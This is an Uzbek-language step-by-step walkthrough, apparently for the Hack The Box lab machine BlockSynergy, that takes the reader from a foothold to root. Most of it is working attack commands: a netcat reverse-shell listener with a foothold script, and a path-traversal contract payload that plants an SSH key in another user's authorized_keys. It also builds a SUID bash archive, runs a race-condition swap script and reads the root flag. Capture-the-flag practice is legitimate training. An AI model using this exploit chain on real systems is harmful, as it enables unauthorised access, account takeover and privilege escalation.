# 🚀 PWNBOX — 10 DAQIQA, TO'LIQ YO'L (user flag → root flag)

> Pwnbox = brauzerdagi Kali, **VPN tayyor**. WSL muammosi yo'q. Eng ishonchli yo'l.
> (Pwnbox'da tun0 allaqachon ulangan bo'ladi.)

---

## QADAM 0 — Pwnbox ishga tushirish (1 daq)

HTB → BlockSynergy → **Play Machine** → **Start Pwnbox**.
Pwnbox terminalida:

```bash
git clone --branch cline/06ya9m5z --single-branch --depth 1 \
  https://github.com/dilshodgofurov161-ui/Global_AI_Server.git
cd Global_AI_Server/htb-blocksynergy

pip3 install requests 2>/dev/null
echo "10.129.132.212 blocksynergy.htb" | sudo tee -a /etc/hosts
sudo ip link set dev tun0 mtu 1300 2>/dev/null || true

export LHOST=$(ip -4 addr show tun0 | grep -oP 'inet \K[\d.]+')
echo "LHOST = $LHOST"
```

---

## QADAM 1 — Foothold → **walter** shell (2 daq)

**Terminal 1:**
```bash
nc -lvnp 4444
```

**Terminal 2** (shu papkada):
```bash
LHOST=$LHOST LPORT=4444 ./03_foothold.sh
```

Terminal 1'da shell paydo bo'ladi. Tekshiring:
```bash
id          # uid=1000(walter) gid=1000(walter)
```
Ishlamasa → `poc/RUN.md` oxiridagi "Muammo bo'lsa" jadvali (`test_node/1` ↔ `/2`).

---

## QADAM 2 — walter → **hank** (2 daq)

**Terminal 3 (Pwnbox):**
```bash
rm -f /tmp/hank_key*; ssh-keygen -t rsa -b 4096 -f /tmp/hank_key -N "" -q
cat /tmp/hank_key.pub          # nusxa oling
```

**WALTER SHELL ichida** (`<PUBLIC_KEY_HERE>` o'rniga yuqoridagi kalit):
```bash
cat > /tmp/pwn_contract.json << 'EOF'
{
  "name": "pwn", "id": 1, "owner": "Developer",
  "logic": { "claim": "allow" },
  "debug": "True",
  "hooks": { "on_claim": "log" },
  "__meta__": {
    "log_file": "../../../../home/hank/.ssh/authorized_keys",
    "log_content": { "on_claim": "\nssh-rsa <PUBLIC_KEY_HERE>\n" }
  }
}
EOF

curl -s -c /tmp/flask_cookies -b /tmp/flask_cookies -X POST http://127.0.0.1:5000/dashboard \
  -F "action=upload_contract" -F "contract_file=@/tmp/pwn_contract.json"
```

**Terminal 3:**
```bash
ssh -i /tmp/hank_key -o StrictHostKeyChecking=no hank@blocksynergy.htb
```
→ `hank@blocksynergy:~$`

---

## QADAM 3 — SUID arxiv (**HANK shell ichida**, 1 daq)

```bash
tar --owner=0 --group=0 --mode=4755 \
    --transform='s|^bash$|opt/blocksynergy/.diag|' \
    -czf /tmp/restore_suid.tar.gz -C /bin bash
ls -la /tmp/restore_suid.tar.gz
```

---

## QADAM 4 — Race (**HANK shell ichida**, 1-2 daq)

`04_watcher.py` ni targetga tashlang (Terminal 3 dan):
```bash
scp -i /tmp/hank_key Global_AI_Server/htb-blocksynergy/04_watcher.py \
    hank@blocksynergy.htb:/tmp/
```

**HANK shell ichida:**
```bash
cd /tmp && python3 04_watcher.py
```
Kutilgan chiqish:
```
[+] restore trigger qilindi
[+] arxiv paydo bo'ldi: _opt_blocksynergy.tar.gz
[+] yozish tugadi (download/checksum)
[*] ALMASHTIRILMOQDA...
[+] SWAP SUCCESS
```
Ishlamasa: `python3 04_watcher.py --brute`

---

## QADAM 5 — 🔥 ROOT FLAG (**HANK shell ichida**)

```bash
ls -la /opt/blocksynergy/.diag
/opt/blocksynergy/.diag -p -c "id; cat /root/root.txt"
```
→ `uid=0(root)` + flag. HTB saytida **Submit Root Flag** ga kiriting.

---

## Muammo bo'lsa

| Belgi | Yechim |
|---|---|
| `03_foothold.sh`: PUB topilmadi | `poc/RUN.md` — `wallet.json` ni ko'ring |
| Listener'da shell yo'q | `test_node/1` ↔ `/2` ni almashtiring; `LHOST` to'g'rimi tekshiring |
| SSH osilib qoladi | `sudo ip link set dev tun0 mtu 1300` |
| `curl 127.0.0.1:5000` javob bermaydi | Flask servis ishlab turibdimi: `ss -tlnp \| grep 5000` |
| SSHK `authorized_keys` ishlamadi | kalit to'liq nusxalanganini tekshiring (bir qatorda) |
| `SWAP SUCCESS` chiqmadi | `python3 04_watcher.py --brute`; keyin `.diag` ni tekshiring |
| `.diag` yo'q | `ls -la /var/restore_work/` — restore tsiklini qayta trigger qiling |

## Nima uchun bu ishonchli

- `03_foothold.sh` — mock server ustida **to'liq sinovdan o'tgan** ✅
- `04_watcher.py` — NUL parsing **test qilingan**; ochiq PoC'dagi xato tuzatilgan
  (eski versiya `_opt_blocksynergy.tar.gz\x00\x00...` qaytarib hech qachon mos kelmasdi) ✅
